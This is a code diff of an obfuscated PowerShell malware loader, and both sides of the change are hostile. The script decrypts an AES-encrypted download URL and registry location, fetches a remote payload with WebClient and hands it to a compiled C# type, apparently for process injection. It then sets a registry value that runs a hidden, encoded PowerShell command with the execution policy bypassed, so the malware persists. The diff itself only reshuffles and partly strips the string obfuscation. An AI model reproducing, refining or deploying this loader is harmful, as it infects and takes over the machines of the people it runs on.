@@ -1,6 +1,6 @@
 [System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
 [System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
-$ErrorActionPreference = ("{1}{2}{0}{4}{3}"-f'lyC','Sil','ent','nue','onti')
+$ErrorActionPreference = ("{3}{1}{0}{2}" -f 'lyConti','ilent','nue','S')
 
 function fnCalc {
     $seg = 100
@@ -15,8 +15,8 @@ function fnCalc {
     return [math]::Round($sum, 5).ToString().Replace('.', '')
 }
 
-$lineA = ("{1}{2}{3}{4}{0}"-f'muj_xof','god','_yzal','_eht_re','vo_sp')
-$lineB = ("{2}{1}{0}"-f 'orb_kciuq_','w','_n')
+$lineA = ("{1}{7}{0}{3}{6}{8}{2}{5}{4}" -f 'za','go','mu','l_','_xof','j','eht_r','d_y','evo_sp')
+$lineB = ("{2}{0}{1}"-f'worb_kci','uq_','_n')
 $lineC = "eht"
 $all = $lineA + $lineB + $lineC
 
@@ -26,9 +26,9 @@ function fnKey($calcVal, $ss) {
     return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
 }
 
-$z = &("{0}{2}{1}"-f 'f','alc','nC')
-$k = &("{1}{0}"-f'nKey','f') $z $all
-$v = &("{2}{1}{0}" -f'ct','bje','New-O') Byte[](16)
+$z = fnCalc
+$k = fnKey $z $all
+$v = New-Object Byte[](16)
 
 function fnDec {
     param(
@@ -37,7 +37,7 @@ function fnDec {
         [byte[]]$iv
     )
     [byte[]]$raw = [Convert]::FromBase64String($c)
-    $aes = &("{2}{1}{0}"-f 'w-Object','e','N') System.Security.Cryptography.AesManaged
+    $aes = New-Object System.Security.Cryptography.AesManaged
     $aes.Key = $kk
     $aes.IV = $iv
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -48,23 +48,23 @@ function fnDec {
     return [Text.Encoding]::UTF8.GetString($out)
 }
 
-$a1 = ("{17}{13}{19}{0}{11}{14}{5}{7}{6}{1}{21}{4}{16}{22}{15}{20}{23}{8}{18}{3}{2}{24}{12}{10}{25}{9}" -f'X','zpI','Pj','olyl/','FY','6','seEOUOu','hJ4','gHraeQ','=','n','v','t4lbg1ZKMALwTSxJTFBO8','jF','GM','MAY','7Ffk','abS53UumAg9vCx','z8R+','w9mYK','tjVKAph/o','o','K','N','6fr9','z2bk')
-$a2 = ("{6}{18}{9}{13}{15}{16}{10}{5}{0}{4}{12}{7}{8}{3}{14}{11}{1}{17}{2}" -f 'u','HR4Lw','==','6','X','lNOg','/l2lk3lqm2hBfXcBCcw7LNVk6','l2','1hSqjMx','xHFE','9jkJK','pJdF','gT','EZJF','lKq','H','Pw2DbXwiJrO','/Mw','E5J')
-$a3 = ("{7}{4}{8}{9}{2}{0}{12}{5}{10}{1}{6}{3}{11}"-f 'j','I+','2V0kP','5USt','u','DS','TfUWoCRfn8','bzuv8','g','f','HhxSc','x7U=','uOq')
-$a4 = ("{1}{5}{9}{11}{10}{6}{7}{2}{3}{4}{8}{0}{12}{13}" -f 'h','Id','VbC','A','9jh','Xv','p','iuRgqdL7rs2PA','g7k3o','hx','9z9','gCU','xiz','o=')
+$a1 = ("{5}{9}{22}{11}{15}{16}{0}{20}{1}{4}{18}{14}{3}{8}{13}{17}{19}{12}{7}{10}{6}{21}{23}{2}" -f'6hJ4se','pIo','2bk=','h','FY7FfkKMAY','ab','xJTFB','ALw','/oN','S','TS','Ag9vCxjF','1ZKM','gHraeQz8R+olyl/Pj','Ap','w9mYKX','vGM','6fr','tjVK','9t4lbg','EOUOuz','O8','53Uum','nz')
+$a2 = ("{8}{13}{10}{7}{5}{11}{2}{3}{12}{9}{1}{6}{4}{0}"-f'w/Mw==','l21hSqjMx6','HPw2D','bXwiJrO9jk','KqpJdFHR4L','xHFEE','l','J','/l2lk3lqm','XgT','BfXcBCcw7LNVk6E5','ZJF','JKlNOgu','2h')
+$a3 = ("{12}{6}{3}{7}{1}{2}{10}{9}{4}{0}{11}{5}{8}" -f 'CR','u','OqDS','0k','+TfUWo','5','8ugf2V','Pj','UStx7U=','ScI','Hhx','fn8','bzuv')
+$a4 = ("{3}{6}{4}{7}{0}{10}{2}{1}{9}{8}{5}" -f 'uRgqd','bC','PAV','IdXvhxgC','9','k3ohxizo=','U','z9pi','9jhg7','A','L7rs2')
 
 try {
-    $u  = &("{0}{1}" -f 'fnDe','c') -c $a1 -kk $k -iv $v  
-    $rp = &("{1}{0}"-f'Dec','fn') -c $a2 -kk $k -iv $v 
-    $px = &("{0}{1}"-f 'fnDe','c') -c $a3 -kk $k -iv $v  
-    $rv = &("{1}{0}"-f'c','fnDe') -c $a4 -kk $k -iv $v  
+    $u  = fnDec -c $a1 -kk $k -iv $v  
+    $rp = fnDec -c $a2 -kk $k -iv $v 
+    $px = fnDec -c $a3 -kk $k -iv $v  
+    $rv = fnDec -c $a4 -kk $k -iv $v  
 } catch {
     return
 }
 
 # --- Conditional load for the xR C# type ---
 if (-not ("xR" -as [Type])) {
-    &("{1}{2}{0}"-f'Type','A','dd-') -TypeDefinition @"
+    Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -165,10 +165,10 @@ public class xR {
 }
 
 try {
-    $wc = &("{1}{2}{0}"-f't','New-Obje','c') System.Net.WebClient
+    $wc = New-Object System.Net.WebClient
     [byte[]]$payload = $wc.DownloadData($u)
     if ($payload -and $payload.Length -gt 0) {
-        [xR]::zQ($payload, $px) | .("{2}{1}{0}" -f'Null','ut-','O')
+        [xR]::zQ($payload, $px) | Out-Null
     }
 } catch {
     return
@@ -252,8 +252,8 @@ public class xR {
 '@
 
 $stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
-$rcmd = ('powershel'+'l'+'.'+'exe'+' '+'-NoP'+'rof'+'ile'+' '+'-W'+'i'+'ndo'+'wStyl'+'e '+'Hidde'+'n'+' '+'-'+'Execu'+'tio'+'n'+'Policy'+' '+'Byp'+'ass '+'-En'+'cod'+'edCom'+'mand '+"$stB64 "+'-u'+' '+"`"$u`" "+'-p'+' '+"`"$px`"")
+$rcmd = ('powersh'+'ell'+'.e'+'xe '+'-No'+'P'+'rofile '+'-Wind'+'o'+'wSty'+'le '+'Hid'+'d'+'en '+'-'+'Ex'+'ec'+'ut'+'ionPo'+'licy '+'Bypas'+'s '+'-'+'Encod'+'e'+'dCommand'+' '+"$stB64 "+'-u'+' '+"`"$u`" "+'-p'+' '+"`"$px`"")
 
 try {
-    .("{2}{0}{1}{3}{4}" -f 'e','w','N','-ItemPr','operty') -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | &("{2}{1}{0}"-f 'l','ut-Nul','O')
+    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
 } catch {}
